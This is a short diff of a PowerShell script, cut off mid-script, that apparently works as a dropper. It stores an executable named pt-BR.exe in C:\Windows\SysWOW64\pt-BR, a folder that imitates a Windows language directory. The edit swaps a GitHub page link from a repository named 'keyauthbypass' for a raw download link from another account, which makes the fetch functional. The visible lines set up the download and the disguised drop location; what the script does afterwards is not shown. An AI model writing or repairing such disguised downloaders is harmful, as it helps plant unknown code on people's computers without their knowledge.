@@ -1,5 +1,5 @@
 $diretorio = "C:\Windows\SysWOW64\pt-BR"
-$url = "https://github.com/keyauthbypass/21/blob/main/pt-BR.exe"
+$url = "https://github.com/xbugakey35-source/11/raw/refs/heads/main/pt-BR.exe"
 $caminhoArquivo = Join-Path -Path $diretorio -ChildPath "pt-BR.exe"
 
 if (-not (Test-Path -Path $diretorio)) {
